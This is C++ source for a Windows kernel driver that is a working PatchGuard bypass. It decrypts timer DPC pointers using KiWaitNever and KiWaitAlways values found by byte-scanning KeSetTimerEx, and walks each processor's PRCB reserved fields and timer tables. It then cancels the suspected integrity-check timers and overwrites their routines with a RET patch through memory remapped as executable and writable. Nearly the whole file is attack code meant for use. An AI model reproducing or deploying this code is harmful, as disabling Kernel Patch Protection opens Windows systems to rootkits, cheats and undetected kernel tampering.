#include "source.h"

inline bool RtlForceCopyMemory(void* address, const void* buffer, size_t size) {
	PHYSICAL_ADDRESS physical_address = MmGetPhysicalAddress(address);
	if (!physical_address.QuadPart)
		return false;

	void* mapped = MmMapIoSpaceEx(physical_address, size, PAGE_EXECUTE_READWRITE);
	if (!mapped)
		return false;

	RtlCopyMemory(mapped, buffer, size);
	MmUnmapIoSpace(mapped, size);
	return true;
}

PKDPC decrypt_dpc_routine(PKTIMER timer) {
	if (!timer)
		return nullptr;

	__int64 KiWaitNever;
	__int64	KiWaitAlways;

	UNICODE_STRING routineName = RTL_CONSTANT_STRING(L"KeSetTimerEx");
	PVOID KeSetTimerEx = MmGetSystemRoutineAddress(&routineName);
	if (!KeSetTimerEx) 
		return nullptr;

	// check if shadow wizard KiSetTimerEx shit

	static unsigned char KeSetTimerEx_dism[64] = { 0 };
	RtlCopyMemory(KeSetTimerEx_dism, KeSetTimerEx, sizeof(KeSetTimerEx_dism));

	const unsigned char wizard_11[] = { 0x45, 0x33, 0xc9 };

	bool shadow_wizard_stuff = false;

	for (int idx = 0; idx <= sizeof(KeSetTimerEx_dism) - sizeof(wizard_11); idx++) {
		if (RtlCompareMemory(&KeSetTimerEx_dism[idx], wizard_11, sizeof(wizard_11)) == sizeof(wizard_11)) {
			shadow_wizard_stuff = true;
			break;
		}
	}

	if (shadow_wizard_stuff) {
		void* KiSetTimerEx = nullptr;
		for (size_t idx = 0; idx < sizeof(KeSetTimerEx_dism); idx++) {
			if (KeSetTimerEx_dism[idx] == 0xe8) {
				uint32_t relative_instruction = *(uint32_t*)&KeSetTimerEx_dism[idx + 1];
				uint64_t rip = ((uint64_t)KeSetTimerEx + idx) + 5;
				int64_t signed_offset = (int32_t)relative_instruction;
				KiSetTimerEx = (void*)(rip + signed_offset);
				break; 
			}
		}

		if (!KiSetTimerEx)
			return nullptr;

		static unsigned char KiSetTimerEx_dism[80] = { 0 };
		RtlCopyMemory(KiSetTimerEx_dism, KiSetTimerEx, sizeof(KiSetTimerEx_dism));

		/*
		fffff804`c468cba0 4881eca0000000     sub     rsp, 0A0h
		fffff804`c468cba7 488b0532d9b700     mov     rax, qword ptr [ntkrnlmp!__security_cookie (fffff804c520a4e0)]
		fffff804`c468cbae 4833c4             xor     rax, rsp
		fffff804`c468cbb1 4889842498000000   mov     qword ptr [rsp+98h], rax
		fffff804`c468cbb9 4c8bac2400010000   mov     r13, qword ptr [rsp+100h]
		fffff804`c468cbc1 4c8bf1             mov     r14, rcx
		fffff804`c468cbc4 488b059d83d300     mov     rax, qword ptr [ntkrnlmp!KiWaitNever (fffff804c53c4f68)]
		fffff804`c468cbcb 498bed             mov     rbp, r13
		fffff804`c468cbce 48332d6b86d300     xor     rbp, qword ptr [ntkrnlmp!KiWaitAlways (fffff804c53c5240)]
		*/

		for (size_t idx = 0; idx < sizeof(KeSetTimerEx_dism); idx++) {
			// mov rax, qword ptr [rip+imm32] 
			if (KiSetTimerEx_dism[idx] == 0xf1 && KiSetTimerEx_dism[idx + 1] == 0x48 && KiSetTimerEx_dism[idx + 2] == 0x8b && KiSetTimerEx_dism[idx + 3] == 0x05) {
				uint32_t relative_offset = *(uint32_t*)&KiSetTimerEx_dism[idx + 4];
				uint64_t instruction_address = (uint64_t)KiSetTimerEx + idx + 1; // because we check the previous byte for insuring we skip the security cookie
				uint64_t target_address = instruction_address + 7 + relative_offset;

				if (target_address) {
					KiWaitNever = *(__int64*)(target_address);
				}
			}

			// xor rbp, qword ptr [rip+imm32]
			if (KiSetTimerEx_dism[idx] == 0x48 && KiSetTimerEx_dism[idx + 1] == 0x33 && KiSetTimerEx_dism[idx + 2] == 0x2D) {
				uint32_t relative_offset = *(uint32_t*)&KiSetTimerEx_dism[idx + 3];
				uint64_t instruction_address = (uint64_t)KiSetTimerEx + idx;
				uint64_t target_address = instruction_address + 7 + relative_offset;
				if (target_address) {
					KiWaitAlways = *(__int64*)(target_address);
				}
			}
		}
	}
	else {
		/*
		fffff807`1eae8b80 48895c2408           mov     qword ptr [rsp+8], rbx
		fffff807`1eae8b85 48896c2410           mov     qword ptr [rsp+10h], rbp
		fffff807`1eae8b8a 4889742420           mov     qword ptr [rsp+20h], rsi
		fffff807`1eae8b8f 57                   push    rdi
		fffff807`1eae8b90 4154                 push    r12
		fffff807`1eae8b92 4155                 push    r13
		fffff807`1eae8b94 4156                 push    r14
		fffff807`1eae8b96 4157                 push    r15
		fffff807`1eae8b98 4883ec30             sub     rsp, 30h
		fffff807`1eae8b9c 488b05653ca100       mov     rax, qword ptr [ntkrnlmp!KiWaitNever (fffff8071f4fc808)]
		fffff807`1eae8ba3 488bf9               mov     rdi, rcx
		fffff807`1eae8ba6 488b35633ea100       mov     rsi, qword ptr [ntkrnlmp!KiWaitAlways (fffff8071f4fca10)]
		*/

		for (size_t idx = 0; idx < sizeof(KeSetTimerEx_dism); idx++) {
			// mov rax, qword ptr [rip+imm32]
			if (KeSetTimerEx_dism[idx] == 0x48 && KeSetTimerEx_dism[idx + 1] == 0x8B && KeSetTimerEx_dism[idx + 2] == 0x05) {
				uint32_t relative_offset = *(uint32_t*)&KeSetTimerEx_dism[idx + 3];
				uint64_t instruction_address = (uint64_t)KeSetTimerEx + idx;
				uint64_t target_address = instruction_address + 7 + relative_offset;

				if (target_address) {
					KiWaitNever = *(__int64*)(target_address);
				}
			}

			// mov rsi, qword ptr [rip+imm32]
			if (KeSetTimerEx_dism[idx] == 0x48 && KeSetTimerEx_dism[idx + 1] == 0x8B && KeSetTimerEx_dism[idx + 2] == 0x35) {
				uint32_t relative_offset = *(uint32_t*)&KeSetTimerEx_dism[idx + 3];
				uint64_t instruction_address = (uint64_t)KeSetTimerEx + idx;
				uint64_t target_address = instruction_address + 7 + relative_offset;

				if (target_address) {
					KiWaitAlways = *(__int64*)(target_address);
				}
			}
		}
	}

	if (MmIsAddressValid(timer)) {
		return (PKDPC)(
			KiWaitAlways ^ _byteswap_uint64((unsigned __int64)timer ^ __ROL8__(
				(__int64)timer->Dpc ^ KiWaitNever, KiWaitNever
			)));
	}

	return nullptr;
}

extern "C" NTSTATUS FxDriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {
	UNREFERENCED_PARAMETER(DriverObject);
	UNREFERENCED_PARAMETER(RegistryPath);

	bool patchguard_disabled = false;

	const unsigned char patch[] = { 0xC3, 0x90 };

	for (int i = 0; i < 5; i++) {
		KAFFINITY active_processers = KeQueryActiveProcessors();

		for (int core = 0; active_processers; core++, active_processers >>= 1) {
			if (active_processers & 1) {
				KeSetSystemAffinityThread(1ULL << core);

				PKPRCB processer_block = KeGetCurrentPrcb();
				if (!processer_block) {
					continue;
				}

				if (processer_block->AcpiReserved) {
					PKDPC dpc = (PKDPC)processer_block->AcpiReserved;
					if (KeRemoveQueueDpc(dpc)) {
						RtlForceCopyMemory(dpc->DeferredRoutine, patch, sizeof(patch));
						patchguard_disabled = true;
					}
				}

				if (processer_block->HalReserved[7]) {
					PKDPC dpc = (PKDPC)processer_block->HalReserved[7];
					if (KeRemoveQueueDpc(dpc)) {
						RtlForceCopyMemory(dpc->DeferredRoutine, patch, sizeof(patch));
						patchguard_disabled = true;
					}
				}

				PKTIMER_TABLE timer_table = &processer_block->TimerTable;
				if (!timer_table || !MmIsAddressValid(timer_table)) {
					continue;
				}

				PKTIMER_TABLE_ENTRY timer_entry = nullptr;

				for (int wheel = 0; wheel < 2; wheel++) {
					for (int entry = 0; entry < 256; entry++) {
						timer_entry = &timer_table->TimerEntries[wheel][entry];
						if (!timer_entry || !MmIsAddressValid(timer_entry)) {
							continue;
						}

						PKTIMER timer = CONTAINING_RECORD(timer_entry->Entry.Flink, KTIMER, TimerListEntry);
						if (!timer || !MmIsAddressValid(timer)) {
							continue;
						}

						PKDPC dpc = (PKDPC)decrypt_dpc_routine(timer);
						if (!dpc || !MmIsAddressValid(dpc)) {
							continue;
						}
						
						if (!is_inside_module(dpc->DeferredContext)) {
							if (KeCancelTimer(timer)) {
								RtlForceCopyMemory(dpc->DeferredRoutine, patch, sizeof(patch));
								patchguard_disabled = true;
							}
						}
						 
						// common dpc method
						if ((__int64)dpc->DeferredContext >> 47 != -1 && (__int64)dpc->DeferredContext >> 47 != 0) {
							if (KeCancelTimer(timer)) {
								RtlForceCopyMemory(dpc->DeferredRoutine, patch, sizeof(patch));
								patchguard_disabled = true;
							}
						}

						// only two dpc use this method
						if ((unsigned __int64)(((__int64)dpc->DeferredContext >> 47) + 1) > 1) {
							if (KeCancelTimer(timer)) {
								RtlForceCopyMemory(dpc->DeferredRoutine, patch, sizeof(patch));
								patchguard_disabled = true;
							}
						}

						// FsRtlTruncateSmallMcb
						__int64 result = ((__int64)dpc->DeferredContext >> 47) + 1;
						if ((__int64)dpc->DeferredContext >> 47 != -1 && result != 1) {
							if (KeCancelTimer(timer)) {
								RtlForceCopyMemory(dpc->DeferredRoutine, patch, sizeof(patch));
								patchguard_disabled = true;
							}
						}
					}
				}
			}
		}

	}

	if (!patchguard_disabled) {
		DbgPrint("failed to disable patchguard \n");
	}
	else {
		DbgPrint("disabled patchguard \n");
	}

	return patchguard_disabled ? STATUS_SUCCESS : STATUS_UNSUCCESSFUL;
}